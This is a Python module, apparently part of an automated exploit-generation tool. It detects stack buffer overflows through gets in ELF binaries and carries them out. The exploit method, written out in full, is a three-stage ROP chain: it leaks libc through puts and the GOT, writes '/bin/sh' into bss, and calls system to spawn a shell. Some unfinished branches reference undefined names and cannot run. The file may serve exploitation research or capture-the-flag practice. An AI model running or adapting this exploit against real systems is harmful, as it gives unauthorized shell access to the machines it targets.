import smrop
import logging
import json
import claripy

import pwn

logger = logging.getLogger(name=__name__)

ANALYSES = []
def register(clazz):
    # TODO: probably don't want to instantiate
    # here, makes more sense to instantiate
    # when the program context is available.
    ANALYSES.append(clazz)
    return clazz

class Vulnerability:

    @staticmethod
    def detect(context, function, program):
        raise NotImplementedError()
    
    # Probably don't care about this interface, we instantiate in detect
    def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
        raise NotImplementedError()
    
    def exploit(self, function):
        raise NotImplementedError()

# These should probably be factored out into a separate
# function analysis module and be part of a Variable class or something
def isLocal(name, function):
    return name in [v["name"] for v in function["variables"]]

def isParameter(name, function):
    return name in function["arguments"]

def getLocal(name, function):
    for v in function["variables"]:
        if v["name"] == name:
            return v
@register
class StackBufferOverflowVulnerability(Vulnerability):
    name = "StackBufferOverflowVulnerability"
    short_name = "sbo"
    options = [("suffix", "str", "Ouput immediately after the buffer overflow call.")]
    EXPLOIT_SIZE = 0x40 #TODO: Compute this properly.

    def __init__(self,
            function,
            binary : pwn.ELF,
            libc : pwn.ELF,
            targetFunc,
            functionExit,
            stackOffset):
        self.function = function
        self.binary = binary
        self.libc = libc
        self.targetFunc = targetFunc
        self.stackOffset = stackOffset
        self.functionExit = functionExit
    
    def __str__(self):
        fields = {
            "vulnerability": "StackBufferOverflowVulnerability",
            "function": str(self.function["name"]),
            "binary": str(self.binary),
            "libc": str(self.libc),
            "targetFunc": str(self.targetFunc),
            "stackOffset": str(self.stackOffset),
            # TODO: Make these more useful / general
            # TODO: Unify this with options above
            "options": {
            }
        }
        return json.dumps(fields, indent=2)

    # TODO: Make this a real thing.
    @staticmethod
    def requires(context, program, options):
        return [ELF.NO_CANARY, ELF.KNOWN_MAIN, ELF.KNOWN_POP_RDI, ELF.KNOWN_GOT]

    @staticmethod
    def detect(context, function, program, options):
        for call in function["calls"]:
            if call["funcName"] == "gets":
                targetFunc = call
                # assume stack for now
                # need to add check to validate
                # that the argument is on the stack.
                # otherwise, this is not exploitable
                # via this technique
                # TODO: Add check
                arg = call["arguments"][0]
                arg = [v for v in function["variables"] if v["name"] == arg][0]
                stackOffset = arg["stackOffset"]
                return StackBufferOverflowVulnerability(function,
                    context.binary,
                    context.libc,
                    targetFunc=targetFunc,
                    functionExit=function["exitAddresses"][0],
                    stackOffset=stackOffset)
                    
            # Work in progress apparently
            # TODO: Get this working and tested
            # consider blacklist of functions to allow skipping of problematic functions
            # TODO: Update "exploit" to handle the lack of "gets"
            #       Needs to check ropchain to handle additonal arguments
            continue
            if call["funcName"] == "read":
                targetBuffer = call["arguments"][1]
                targetSize = None
                # TODO: add analysis to ghidra to export type info
                # here to figure out if it's a variable or a constant
                try:
                    targetSize = int(call["arguments"][2], 16)
                except:
                    pass
                if targetSize and isLocal(targetBuffer, function):
                    stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
                    if targetSize > (stackOffset + EXPLOIT_SIZE):
                        return StackBufferOverflowVulnerability(function,
                            context.binary,
                            context.libc,
                            targetFunc=call,
                            functionExit=function["exitAddresses"][0],
                            stackOffset=stackOffset)
                        self.targetFunc = call
                        self.stackOffset = stackOffset
                        return BufferOverflow
                return None
        return None

    def entry(self):
        return int(self.function["address"], 16)

    # TODO: gate on detect
    def exploit(self, conn):
        sconn = conn.conn
        function_addr = int(self.function["address"], 16) 
        functionExit = int(self.functionExit, 16)
    
        logger.info("#####")
        logger.info("# STACK BUFFER OVERFLOW - STAGE 1: Leak Libc")
        logger.info("#####")

        # Navigate to targetFunc
        logger.info("Navigating to targetFunc.")
        conn.navigate(int(self.targetFunc["address"],16))

        # Payload1: leak libc location
        prefixlen = abs(self.stackOffset)
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.pop_rdi(self.binary.got["gets"], target='binary') # this REQUIRES gets to be present
        # TODO: make puts a dependency
        # TODO: abstract out puts to any print
        sm.ret("puts", 'binary')
        sm.ret(function_addr, "binary")
        
        logger.info("Sending first payload (to leak 'puts' location)")
       
        payload1 = sm.resolve(binary=0x0, libc=0x0)
        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen), claripy.BVV(payload1+b"\n")])
        logger.info(f"Solution Prefix Payload: {solution_payload}")
        conn.sim_sendline(solution_payload[:-1])
        sconn.sendline(solution_payload[:-1])

        logger.info(f"Navigating to function exit {self.functionExit}")
        conn.navigate(functionExit)

        # We've hit the return, next output is now the 'gets' address
        gets_location = sconn.recvline()[:-1]
        logger.debug(f"gets_location: {gets_location}")
        gets_location = int.from_bytes(gets_location, byteorder='little')
        libcoffset = gets_location - self.libc.symbols["gets"]
        logger.info("Libc found at {}".format(hex(libcoffset)))

        # need to navigate back to the targetFunc
        logger.info("Navigating to targetFunc.")
        conn.navigate(int(self.targetFunc["address"],16))

        logger.info("#####")
        logger.info("# STACK BUFFER OVERFLOW - STAGE 2: Write `/bin/sh` to writeable bss location")
        logger.info("#####")

        # Payload2: send /bin/sh
        target_heap_address = self.binary.bss() + 0x100
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.pop_rdi(target_heap_address)
        sm.ret("gets", "binary")
        sm.ret(function_addr, "binary")
        payload2 = sm.resolve(binary=0x0)
        
        logger.info("Sending second payload (setup write to controlled memory)")
        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2_prefix", size=8*prefixlen), claripy.BVV(payload2+b"\n")])
        conn.sim_sendline(solution_payload[:-1])
        sconn.sendline(solution_payload[:-1])
        logger.info("Navigating to return.")

        logger.info("Navigating to function exit")
        conn.navigate(functionExit)

        # we have exited the function, we can now
        # write /bin/sh to a controlled part of memory
        logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
        conn.sim_sendline(b"/bin/sh\x00")
        sconn.sendline(b"/bin/sh\x00")

        # need to navigate back to the targetFunc
        logger.info("Navigating to targetFunc.")
        conn.navigate(int(self.targetFunc["address"],16))

        logger.info("#####")
        logger.info("# STACK BUFFER OVERFLOW - STAGE 3: Perform system invocation")
        logger.info("#####")

        # payload3
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.pop_rdi(target_heap_address)
        sm.nop()
        sm.ret("system", "libc")

        payload3 = sm.resolve(binary=0x0, libc=libcoffset)

        logger.info("Sending final payload (invoke system('bin/sh'))")
        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload_prefix3", size=8*prefixlen), claripy.BVV(payload3+b"\n")])
        conn.sim_sendline(solution_payload[:-1])
        sconn.sendline(solution_payload[:-1])
        
        # Payload sent, now exit the function.
        logger.info("Navigating to function exit")
        conn.navigate(functionExit)
        
        logger.info("We should now have a shell.")
